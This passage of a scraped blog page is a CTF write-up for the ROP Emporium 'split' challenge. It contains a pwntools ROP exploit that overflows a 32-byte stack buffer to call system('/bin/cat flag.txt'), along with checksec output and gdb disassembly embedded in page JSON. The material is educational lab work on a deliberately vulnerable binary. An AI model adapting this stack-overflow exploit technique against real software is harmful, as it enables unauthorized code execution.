</span><span class="code-line">system_addr <span class="token operator">=</span> pwn<span class="token punctuation">.</span>p64<span class="token punctuation">(</span><span class="token number">0x400560</span><span class="token punctuation">)</span>   <span class="token comment">#address of system</span>
</span><span class="code-line">pop_rdi_ret <span class="token operator">=</span> pwn<span class="token punctuation">.</span>p64<span class="token punctuation">(</span><span class="token number">0x004007c3</span><span class="token punctuation">)</span>  <span class="token comment"># pop rdi; ret gadget</span>
</span><span class="code-line">bin_cat_addr <span class="token operator">=</span> pwn<span class="token punctuation">.</span>p64<span class="token punctuation">(</span><span class="token number">0x00601060</span><span class="token punctuation">)</span>  <span class="token comment">#bin cat flag.txt address</span>
</span><span class="code-line">
</span><span class="code-line">payload <span class="token operator">=</span> <span class="token string">b&quot;A&quot;</span> <span class="token operator">*</span> <span class="token number">32</span>  <span class="token comment">#fill the buffer</span>
</span><span class="code-line">payload <span class="token operator">+=</span> <span class="token string">b&quot;B&quot;</span> <span class="token operator">*</span><span class="token number">8</span>   <span class="token comment"># overwrite  rbp</span>
</span><span class="code-line">payload <span class="token operator">+=</span> pop_rdi_ret <span class="token comment"># pop rdi gadget</span>
</span><span class="code-line">payload <span class="token operator">+=</span> bin_cat_addr <span class="token comment"># argument passed to the system function</span>
</span><span class="code-line">payload <span class="token operator">+=</span> system_addr   <span class="token comment">#call system</span>
</span><span class="code-line">
</span><span class="code-line">io<span class="token punctuation">.</span>writeafter<span class="token punctuation">(</span><span class="token string">&#x27;&gt;&#x27;</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>
</span><span class="code-line">
</span><span class="code-line">pwn<span class="token punctuation">.</span>info<span class="token punctuation">(</span>io<span class="token punctuation">.</span>clean<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
</span></code></pre></div><p>Running the above code we get a flag.</p><div><span style="box-sizing:border-box;display:inline-block;overflow:hidden;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;position:relative;max-width:100%"><span style="box-sizing:border-box;display:block;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;max-width:100%"><img style="display:block;max-width:100%;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0" alt="" aria-hidden="true" src="data:image/svg+xml,%3csvg%20xmlns=%27http://www.w3.org/2000/svg%27%20version=%271.1%27%20width=%27755%27%20height=%2795%27/%3e"/></span><img alt="" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" decoding="async" data-nimg="intrinsic" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%"/><noscript><img alt="" src="/static/images/ropemporium/split_flag.png" decoding="async" data-nimg="intrinsic" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%" loading="lazy"/></noscript></span></div><blockquote><p><strong>To avoid the segmentation fault of the above, we can overwrite the rbp address with exit function address in order to exit without segfault.</strong></p></blockquote></div><div id="comment"></div></div><footer><div class="divide-gray-200 text-sm font-medium leading-5 dark:divide-gray-700 xl:col-start-1 xl:row-start-2 xl:divide-y"><div class="py-4 xl:py-8"><h2 class="text-xs uppercase tracking-wide text-gray-500 dark:text-gray-400">Tags</h2><div class="flex flex-wrap"><a class="mr-3 text-sm font-medium uppercase text-primary-500 hover:text-primary-600 dark:hover:text-primary-400" href="/tags/ropemporium">ropemporium</a><a class="mr-3 text-sm font-medium uppercase text-primary-500 hover:text-primary-600 dark:hover:text-primary-400" href="/tags/rop">rop</a><a class="mr-3 text-sm font-medium uppercase text-primary-500 hover:text-primary-600 dark:hover:text-primary-400" href="/tags/pwn">pwn</a></div></div><div class="flex justify-between py-4 xl:block xl:space-y-8 xl:py-8"><div><h2 class="text-xs uppercase tracking-wide text-gray-500 dark:text-gray-400">Previous Article</h2><div class="text-primary-500 hover:text-primary-600 dark:hover:text-primary-400"><a href="/blog/ropemporium-write4">Return-Oriented Programming - Write4</a></div></div><div><h2 class="text-xs uppercase tracking-wide text-gray-500 dark:text-gray-400">Next Article</h2><div class="text-primary-500 hover:text-primary-600 dark:hover:text-primary-400"><a href="/blog/ropemporium-ret2win">Return-Oriented Programming - ret2win</a></div></div></div></div><div class="sticky top-0 pt-4 xl:pt-8"><a class="text-primary-500 hover:text-primary-600 dark:hover:text-primary-400" href="/blog">← Back to the Blog</a><div class="hidden md:block"><div class="mt-5 space-y-1 text-sm"><p class="text-lg font-bold">Table of content</p></div></div></div></footer></div></div></article></div></main><footer><div class="mt-16 flex flex-col items-center"><div class="mb-3 flex space-x-4"><a class="text-sm text-gray-500 transition hover:text-gray-600" target="_blank" rel="noopener noreferrer" href="mailto:thuri783@gmail.com"><span class="sr-only">mail</span><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" class="fill-current text-gray-700 hover:text-blue-500 dark:text-gray-200 dark:hover:text-blue-400 h-6 w-6"><path d="M2.003 5.884 10 9.882l7.997-3.998A2 2 0 0 0 16 4H4a2 2 0 0 0-1.997 1.884z"></path><path d="m18 8.118-8 4-8-4V14a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8.118z"></path></svg></a><a class="text-sm text-gray-500 transition hover:text-gray-600" target="_blank" rel="noopener noreferrer" href="https://github.com/thuri10"><span class="sr-only">github</span><svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" class="fill-current text-gray-700 hover:text-blue-500 dark:text-gray-200 dark:hover:text-blue-400 h-6 w-6"><path d="M12 .297c-6.63 0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12"></path></svg></a><a class="text-sm text-gray-500 transition hover:text-gray-600" target="_blank" rel="noopener noreferrer" href="https://twitter.com/0xhexski"><span class="sr-only">twitter</span><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" class="fill-current text-gray-700 hover:text-blue-500 dark:text-gray-200 dark:hover:text-blue-400 h-6 w-6"><path d="M23.953 4.57a10 10 0 0 1-2.825.775 4.958 4.958 0 0 0 2.163-2.723c-.951.555-2.005.959-3.127 1.184a4.92 4.92 0 0 0-8.384 4.482C7.69 8.095 4.067 6.13 1.64 3.162a4.822 4.822 0 0 0-.666 2.475c0 1.71.87 3.213 2.188 4.096a4.904 4.904 0 0 1-2.228-.616v.06a4.923 4.923 0 0 0 3.946 4.827 4.996 4.996 0 0 1-2.212.085 4.936 4.936 0 0 0 4.604 3.417 9.867 9.867 0 0 1-6.102 2.105c-.39 0-.779-.023-1.17-.067a13.995 13.995 0 0 0 7.557 2.209c9.053 0 13.998-7.496 13.998-13.985 0-.21 0-.42-.015-.63A9.935 9.935 0 0 0 24 4.59z"></path></svg></a></div><div class="mb-2 flex space-x-2 text-sm text-gray-500 dark:text-gray-400"><div>Thuri10</div><div> • </div><div>© 2022</div><div> • </div><a href="/">Solar Bits</a></div><div class="mb-8 text-sm text-gray-500 dark:text-gray-400"><a target="_blank" rel="noopener noreferrer" href="https://github.com/timlrx/tailwind-nextjs-starter-blog">Tailwind Nextjs Theme</a></div></div></footer></div></div></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"post":{"mdxSource":"var Component=(()=\u003e{var p=Object.create;var o=Object.defineProperty;var d=Object.getOwnPropertyDescriptor;var m=Object.getOwnPropertyNames;var h=Object.getPrototypeOf,N=Object.prototype.hasOwnProperty;var k=(a,s)=\u003e()=\u003e(s||a((s={exports:{}}).exports,s),s.exports),u=(a,s)=\u003e{for(var r in s)o(a,r,{get:s[r],enumerable:!0})},l=(a,s,r,n)=\u003e{if(s\u0026\u0026typeof s==\"object\"||typeof s==\"function\")for(let c of m(s))!N.call(a,c)\u0026\u0026c!==r\u0026\u0026o(a,c,{get:()=\u003es[c],enumerable:!(n=d(s,c))||n.enumerable});return a};var b=(a,s,r)=\u003e(r=a!=null?p(h(a)):{},l(s||!a||!a.__esModule?o(r,\"default\",{value:a,enumerable:!0}):r,a)),g=a=\u003el(o({},\"__esModule\",{value:!0}),a);var i=k((F,t)=\u003e{t.exports=_jsx_runtime});var y={};u(y,{default:()=\u003ew,frontmatter:()=\u003ef});var e=b(i()),f={title:\"Return-Oriented Programming - Split\",date:\"2021-12-20\",tags:[\"ropemporium\",\"rop\",\"pwn\"],draft:!1,summary:\"Combine elements from the ret2win challenge that have been split apart to beat this challenge. Learn how to use another tool whilst crafting a short ROP chain.\",layout:\"PostLayout\",images:\"/static/images/ropemporium/split.jpg\",canonicalUrl:null};function x(a={}){let{wrapper:s}=a.components||{};return s?(0,e.jsx)(s,Object.assign({},a,{children:(0,e.jsx)(r,{})})):r();function r(){let n=Object.assign({h2:\"h2\",a:\"a\",span:\"span\",p:\"p\",blockquote:\"blockquote\",strong:\"strong\",code:\"code\",pre:\"pre\",div:\"div\"},a.components),{Image:c}=n;return c||v(\"Image\",!0),(0,e.jsxs)(e.Fragment,{children:[(0,e.jsxs)(n.h2,{id:\"introduction\",children:[(0,e.jsx)(n.a,{href:\"#introduction\",\"aria-hidden\":\"true\",tabIndex:\"-1\",children:(0,e.jsx)(n.span,{className:\"icon icon-link\"})}),\"Introduction\"]}),(0,e.jsx)(n.p,{children:\"Challenge Description\"}),(0,e.jsx)(n.blockquote,{children:(0,e.jsx)(n.p,{children:\"The elements that allowed you to complete ret2win are still present, they've just been split apart. Find them and recombine them using a short ROP chain\"})}),(0,e.jsxs)(n.p,{children:[\"The goal of this challenge is to understand how function arguments are passed in 64bit machine when doing return oriented programming. The target binary can be downloaded from the authors website \",(0,e.jsx)(n.a,{href:\"https://ropemporium.com\",children:\"ropemporium\"}),\".\"]}),(0,e.jsxs)(n.p,{children:[\"First we check the binary protections enabled on the downloaded. Only \",(0,e.jsx)(n.strong,{children:\"NX\"}),\" (Not executable) is enabled on the device according to \",(0,e.jsx)(n.code,{children:\"checksec\"}),\" binary utility as shown in the image below.\"]}),(0,e.jsx)(n.pre,{className:\"language-bash\",children:(0,e.jsxs)(n.code,{className:\"code-highlight language-bash\",children:[(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"vx@archie:split$ checksec --file\",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),`split\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`    Arch:     amd64-64-little\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`    RELRO:    Partial RELRO\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`    Stack:    No canary found\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`    NX:       NX enabled\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"    PIE:      No PIE \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"0x400000\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]})]})}),(0,e.jsxs)(n.p,{children:[\"From analysis of binary we use gdb debugger in order to analyze the functions present in the binary in order to understand the logic. We disassemble \",(0,e.jsx)(n.strong,{children:\"pwnme\"}),\" function as in the image below.The function looks familiar as for the ret2win function.\"]}),(0,e.jsx)(n.pre,{className:\"language-nasm\",children:(0,e.jsxs)(n.code,{className:\"code-highlight language-nasm\",children:[(0,e.jsx)(n.span,{className:\"code-line\",children:`(gdb) disas pwnme\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`Dump of assembler code for function pwnme:\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x00000000004006e8\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003c\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003e\"}),\":\tpush   \",(0,e.jsx)(n.span,{className:\"token register variable\",children:\"rbp\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x00000000004006e9\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003c\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"1\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003e\"}),\":\tmov    \",(0,e.jsx)(n.span,{className:\"token register variable\",children:\"rbp\"}),\",\",(0,e.jsx)(n.span,{className:\"token register variable\",children:\"rsp\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x00000000004006ec\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003c\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"4\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003e\"}),\":\tsub    \",(0,e.jsx)(n.span,{className:\"token register variable\",children:\"rsp\"}),\",\",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x20\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x00000000004006f0\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003c\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"8\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003e\"}),\":\tlea    \",(0,e.jsx)(n.span,{className:\"token register variable\",children:\"rax\"}),\",\",(0,e.jsx)(n.span,{className:\"token operator\",children:\"[\"}),(0,e.jsx)(n.span,{className:\"token register variable\",children:\"rbp\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0x20\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"]\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x00000000004006f4\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003c\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"12\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003e\"}),\":\tmov    \",(0,e.jsx)(n.span,{className:\"token register variable\",children:\"edx\"}),\",\",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x20\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x00000000004006f9\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003c\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"17\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003e\"}),\":\tmov    \",(0,e.jsx)(n.span,{className:\"token register variable\",children:\"esi\"}),\",\",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x0\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x00000000004006fe\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003c\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"22\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003e\"}),\":\tmov    \",(0,e.jsx)(n.span,{className:\"token register variable\",children:\"rdi\"}),\",\",(0,e.jsx)(n.span,{className:\"token register variable\",children:\"rax\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x0000000000400701\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003c\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"25\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003e\"}),\":\tcall   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x400580\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003c\"}),\"memset@plt\",(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003e\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x0000000000400706\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003c\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"30\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003e\"}),\":\tmov    \",(0,e.jsx)(n.span,{className:\"token register variable\",children:\"edi\"}),\",\",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x400810\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x000000000040070b\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003c\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"35\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003e\"}),\":\tcall   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x400550\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003c\"}),\"puts@plt\",(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003e\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x0000000000400710\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003c\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"40\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003e\"}),\":\tmov    \",(0,e.jsx)(n.span,{className:\"token register variable\",children:\"edi\"}),\",\",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x40083c\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x0000000000400715\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003c\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"45\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003e\"}),\":\tmov    \",(0,e.jsx)(n.span,{className:\"token register variable\",children:\"eax\"}),\",\",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x0\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x000000000040071a\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003c\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"50\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003e\"}),\":\tcall   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x400570\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003c\"}),\"printf@plt\",(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003e\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x000000000040071f\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003c\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"55\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003e\"}),\":\tlea    \",(0,e.jsx)(n.span,{className:\"token register variable\",children:\"rax\"}),\",\",(0,e.jsx)(n.span,{className:\"token operator\",children:\"[\"}),(0,e.jsx)(n.span,{className:\"token register variable\",children:\"rbp\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0x20\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"]\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x0000000000400723\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003c\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"59\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003e\"}),\":\tmov    \",(0,e.jsx)(n.span,{className:\"token register variable\",children:\"edx\"}),\",\",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x60\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x0000000000400728\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003c\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"64\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003e\"}),\":\tmov    \",(0,e.jsx)(n.span,{className:\"token register variable\",children:\"rsi\"}),\",\",(0,e.jsx)(n.span,{className:\"token register variable\",children:\"rax\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x000000000040072b\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003c\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"67\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003e\"}),\":\tmov    \",(0,e.jsx)(n.span,{className:\"token register variable\",children:\"edi\"}),\",\",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x0\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x0000000000400730\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003c\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"72\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003e\"}),\":\tcall   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x400590\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003c\"}),\"read@plt\",(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003e\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x0000000000400735\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003c\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"77\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003e\"}),\":\tmov    \",(0,e.jsx)(n.span,{className:\"token register variable\",children:\"edi\"}),\",\",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x40083f\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x000000000040073a\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003c\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"82\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003e\"}),\":\tcall   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x400550\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003c\"}),\"puts@plt\",(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003e\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x000000000040073f\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003c\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"87\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003e\"}),`:\tnop\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x0000000000400740\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003c\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"88\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003e\"}),`:\tleave\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x0000000000400741\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003c\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"89\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003e\"}),`:\tret\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`End of assembler dump.\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`(gdb)\n`})]})}),(0,e.jsxs)(n.p,{children:[\"From the above code, we are filling a buffer of size 0x20(32bytes) with a constant byte of zero. \",(0,e.jsx)(n.strong,{children:\"memset\"}),\" is used to overwrite any values that is present in the memory area specified. The memory region we are overwriting is [rbp-0x20]. This means we are allocating a memory buffer of size 32bytes from the boundary of base pointer address in the stack.\"]}),(0,e.jsx)(n.div,{children:(0,e.jsx)(c,{alt:\"\",src:\"/static/images/ropemporium/stack.png\",width:\"209\",height:\"256\"})}),(0,e.jsxs)(n.p,{children:[\"Next function is \",(0,e.jsx)(n.strong,{children:\"read\"}),\" function, which reads for user input from the standard input file descriptor and stores in the specified buffer. From disassembled code, we are reading \",(0,e.jsx)(n.strong,{children:\"0x60\"}),\" bytes from the user input and storing it in our buffer. This means we are reading more than what the buffer can hold therefore leading to a stack buffer overflow.\"]}),(0,e.jsx)(n.pre,{className:\"language-c\",children:(0,e.jsx)(n.code,{className:\"code-highlight language-c\",children:(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token class-name\",children:\"ssize_t\"}),\" \",(0,e.jsx)(n.span,{className:\"token function\",children:\"read\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token keyword\",children:\"int\"}),\" fd\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"void\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"*\"}),\"buf\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token class-name\",children:\"size_t\"}),\" count\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\";\"}),`\n`]})})}),(0,e.jsxs)(n.p,{children:[\"For this challenge we don`t have a ret2win function which we are to return to. From the disassembly of the binary we have an interesting function called \",(0,e.jsx)(n.strong,{children:\"usefulFunction\"}),\". The usefulFunction, does listing of the files in the directory when called by the function.\"]}),(0,e.jsx)(n.pre,{className:\"language-nasm\",children:(0,e.jsxs)(n.code,{className:\"code-highlight language-nasm\",children:[(0,e.jsx)(n.span,{className:\"code-line\",children:`(gdb) disas usefulFunction\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`Dump of assembler code for function usefulFunction:\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x0000000000400742\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003c\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003e\"}),\":\tpush   